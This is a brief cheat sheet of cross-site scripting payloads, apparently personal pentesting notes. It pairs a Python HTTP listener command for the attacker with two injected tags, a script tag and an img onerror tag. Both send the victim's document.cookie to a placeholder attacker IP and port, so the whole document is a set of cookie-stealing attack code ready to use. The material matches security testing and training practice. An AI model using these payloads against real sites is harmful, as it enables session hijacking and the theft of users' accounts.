# XSS Payloads




# Cookies
-<https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e>

Attacker:
```
python -m http.server [Attacker Port]
```

Target:
```
<script>var i=new Image(); i.src="http://[Attacker IP]:[Attacker Port]/?cookie="+btoa(document.cookie);</script>
```



<img src=x onerror=fetch('http://[Attacker IP]:[Attacker Port]	/?c='+document.cookie);>